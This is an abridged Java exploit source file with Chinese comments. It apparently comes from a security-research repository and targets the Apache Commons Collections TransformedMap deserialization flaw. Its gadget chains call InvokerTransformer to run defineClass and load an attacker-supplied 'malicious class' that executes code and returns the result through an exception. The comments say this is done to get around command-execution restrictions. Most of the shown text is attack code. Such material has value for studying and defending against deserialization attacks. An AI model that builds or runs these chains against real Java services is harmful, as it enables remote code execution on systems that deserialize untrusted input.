/*
 * [业务问题]: 基于 TransformedMap 的反序列化漏洞利用，并实现自定义类加载（defineClass）以触发回显。
 * [实现逻辑]: 在 TransformedMap 的利用链中，通过 DefiningClassLoader 的 defineClass 方法动态加载并实例化恶意类，从而绕过简单的命令执行限制，实现更复杂的逻辑（如通过异常带回执行结果）。
 */
package com.security.bug.collections.v3.no2;

import com.security.bug.common.utils.FileToByteArrayUtil;
import com.security.bug.common.utils.SerializeUtil;
    ...
    private static void testStaticClassInitForDefineClass() throws Exception {
        Transformer[] transformers = new Transformer[] {
                ...
                new InvokerTransformer("defineClass", new Class[] { String.class, byte[].class },
                        new Object[] { "com.security.bug.collections.v3.no2.CallbackRuntime2",
                                FileToByteArrayUtil.readCallbackRuntimeClassBytes(
                                        "com.security.bug/collections/v3/no2/CallbackRuntime2.class") }),
    ...
    private static void testAnnotationInvocationHandlerForDefineClass() throws Exception {
        Transformer[] transformers = new Transformer[] {
                ...
                new InvokerTransformer("newInstance", new Class[] { Object[].class },
                        new Object[] { new Object[0] }),
                new InvokerTransformer("defineClass", new Class[] { String.class, byte[].class },
                        new Object[] { "com.security.bug.collections.v3.no2.CallbackRuntime",
                                FileToByteArrayUtil.readCallbackRuntimeClassBytes(
                                        "com.security.bug/collections/v3/no2/CallbackRuntime.class") }),
                new InvokerTransformer("newInstance", new Class[] {}, new Object[] {}),
